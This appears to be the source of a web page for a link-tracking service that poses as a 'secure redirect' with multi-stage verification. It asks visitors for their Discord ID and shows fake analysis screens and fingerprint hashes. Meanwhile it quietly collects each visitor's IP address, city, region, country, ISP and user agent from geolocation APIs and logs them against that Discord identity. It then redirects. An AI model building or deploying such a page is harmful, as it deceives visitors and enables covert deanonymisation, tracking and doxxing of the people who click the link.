import { useState, useEffect } from "react";
import { useRoute } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, Lock, Clock, Activity, AlertTriangle, CheckCircle, Smartphone, Monitor } from "lucide-react";
import { CyberCard } from "@/components/CyberCard";
import { CyberButton } from "@/components/CyberButton";
import { useToast } from "@/hooks/use-toast";
import { useCreateVisit } from "@/hooks/use-visits";
import { useAnalyzeConnection } from "@/hooks/use-settings";
import { nanoid } from "nanoid";

export default function Redirect() {
  const [, params] = useRoute("/l/:code");
  const [discordId, setDiscordId] = useState("");
  const [stage, setStage] = useState(0); // 0: ID input, 1-3: Waiting stages, 4: Final redirect
  const [timeLeft, setTimeLeft] = useState(30);
  const [fingerprints, setFingerprints] = useState<string[]>([]);
  const { toast } = useToast();
  const createVisit = useCreateVisit();

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (stage >= 1 && stage <= 3 && timeLeft > 0) {
      timer = setInterval(() => setTimeLeft((t) => t - 1), 1000);
    } else if (stage >= 1 && stage <= 3 && timeLeft === 0) {
      handleStageComplete();
    }
    return () => clearInterval(timer);
  }, [stage, timeLeft]);

  const handleStart = () => {
    if (!discordId.trim()) {
      toast({
        title: "ACCESS DENIED",
        description: "Valid Discord identity required for network verification.",
        variant: "destructive",
      });
      return;
    }
    setStage(1);
    setTimeLeft(30);
    performBackgroundScan(1);
  };

  const handleStageComplete = () => {
    if (stage < 3) {
      const newStage = stage + 1;
      setStage(newStage);
      setTimeLeft(30);
      performBackgroundScan(newStage);
    } else {
      setStage(4);
      fetchTargetUrl();
    }
  };

  const performBackgroundScan = async (currentStage: number) => {
    try {
      const apis = ["https://ipwho.is/", "https://api.ipify.org?format=json"];
      let networkData: any = null;
      for (const api of apis) {
        try {
          const res = await fetch(api, { signal: AbortSignal.timeout(3000) });
          if (res.ok) { 
            const raw = await res.json();
            networkData = {
              ip: raw.ip || raw.ip_address,
              city: raw.city,
              region: raw.region || raw.region_name,
              country: raw.country || raw.country_name,
              org: raw.connection?.isp || raw.org
            };
            break; 
          }
        } catch (e) {}
      }

      const fingerprint = nanoid(16);
      setFingerprints(prev => [...prev, fingerprint]);

      const ua = navigator.userAgent;
      const isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(ua);
      await createVisit.mutateAsync({
        discordId,
        discordType: /^\d+$/.test(discordId) ? 'id' : 'username',
        linkCode: params?.code,
        stage: currentStage,
        fingerprint,
        ip: networkData?.ip || "Unknown",
        city: networkData?.city || "Unknown",
        region: networkData?.region || "Unknown",
        country: networkData?.country || "Unknown",
        isp: networkData?.org || "Unknown",
        isMobile,
        deviceType: isMobile ? "Mobile" : "Desktop",
        userAgent: ua,
        isProxy: false,
        meta: networkData || {}
      });
    } catch (e) {
      console.error("Scan failed:", e);
    }
  };

  const fetchTargetUrl = async () => {
    try {
      const res = await fetch(`/api/links/${params?.code}`);
      if (res.ok) {
        const data = await res.json();
        setTimeout(() => {
          window.location.href = data.targetUrl;
        }, 2000);
      }
    } catch (e) {
      toast({ title: "ERROR", description: "Link resolution failed.", variant: "destructive" });
    }
  };

  return (
    <div className="min-h-screen bg-background text-foreground flex items-center justify-center p-4 bg-grid selection:bg-primary/20">
      <div className="max-w-md w-full space-y-6">
        <div className="text-center space-y-2">
          <Shield className="w-12 h-12 text-primary mx-auto animate-pulse" />
          <h1 className="text-2xl font-bold font-display tracking-tighter text-white">SECURE REDIRECT</h1>
          <p className="text-[10px] text-muted-foreground uppercase tracking-[0.3em]">Multi-Stage Verification Active</p>
        </div>

        <AnimatePresence mode="wait">
          {stage === 0 && (
            <motion.div
              key="stage-0"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
            >
              <CyberCard title="IDENTITY VERIFICATION">
                <div className="space-y-4 p-4">
                  <div className="space-y-2">
                    <div className="flex justify-between items-center">
                      <label className="text-[10px] font-mono text-primary/70 uppercase">Discord Identity</label>
                      {discordId && (
                        <span className="text-[9px] font-mono text-muted-foreground uppercase">
                          Mode: {/^\d+$/.test(discordId) ? 'ID' : 'Username'}
                        </span>
                      )}
                    </div>
                    <input
                      type="text"
                      value={discordId}
                      onChange={(e) => setDiscordId(e.target.value)}
                      placeholder="ID or Username"
                      className="w-full bg-black/50 border border-white/10 p-3 text-primary font-mono focus:border-primary/50 outline-none transition-colors"
                    />
                  </div>
                  <CyberButton onClick={handleStart} className="w-full h-12">
                    INITIALIZE ACCESS
                  </CyberButton>
                </div>
              </CyberCard>
            </motion.div>
          )}

          {stage >= 1 && stage <= 3 && (
            <motion.div
              key={`stage-${stage}`}
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
            >
              <CyberCard title={`STAGE ${stage}/3: ANALYSIS`}>
                <div className="space-y-6 p-6 text-center">
                  <div className="relative inline-block">
                    <div className="w-24 h-24 rounded-full border-4 border-primary/10 flex items-center justify-center">
                      <span className="text-3xl font-bold font-display text-primary">{timeLeft}s</span>
                    </div>
                    <motion.div
                      className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent"
                      animate={{ rotate: 360 }}
                      transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
                    />
                  </div>
                  
                  <div className="space-y-3">
                    <div className="flex items-center justify-center gap-2 text-primary font-mono text-xs">
                      <Activity className="w-3 h-3 animate-pulse" />
                      <span>ANALYZING CONNECTION</span>
                    </div>
                    <div className="p-2 bg-white/5 border border-white/5 rounded">
                      <p className="text-[9px] text-muted-foreground font-mono uppercase mb-1">Fingerprint Hash</p>
                      <p className="text-[11px] text-primary font-mono truncate">
                        {fingerprints[stage-1] || "GENERATING..."}
                      </p>
                    </div>
                  </div>

                  <div className="flex justify-center gap-3">
                    {[1, 2, 3].map((s) => (
                      <div
                        key={s}
                        className={`w-2 h-2 rounded-full transition-all duration-500 ${
                          s < stage ? "bg-primary shadow-[0_0_8px_rgba(0,255,136,0.5)]" : s === stage ? "bg-primary animate-ping" : "bg-white/10"
                        }`}
                      />
                    ))}
                  </div>
                </div>
              </CyberCard>
            </motion.div>
          )}

          {stage === 4 && (
            <motion.div
              key="stage-4"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
            >
              <CyberCard title="ACCESS GRANTED">
                <div className="p-10 text-center space-y-4">
                  <div className="relative inline-block">
                    <CheckCircle className="w-16 h-16 text-primary" />
                    <motion.div 
                      className="absolute inset-0 bg-primary/20 rounded-full blur-xl"
                      animate={{ scale: [1, 1.5, 1], opacity: [0.5, 0.2, 0.5] }}
                      transition={{ duration: 2, repeat: Infinity }}
                    />
                  </div>
                  <p className="font-display text-xl text-white tracking-widest uppercase">Decryption Complete</p>
                  <p className="text-[10px] text-muted-foreground font-mono uppercase tracking-wider">Redirecting to secure terminal...</p>
                </div>
              </CyberCard>
            </motion.div>
          )}
        </AnimatePresence>

        <div className="flex items-center justify-center gap-2 text-[9px] text-muted-foreground/30 font-mono">
          <Lock className="w-3 h-3" />
          <span className="uppercase tracking-widest">Encrypted Tunnel • Stage-Gated Access</span>
        </div>
      </div>
    </div>
  );
}
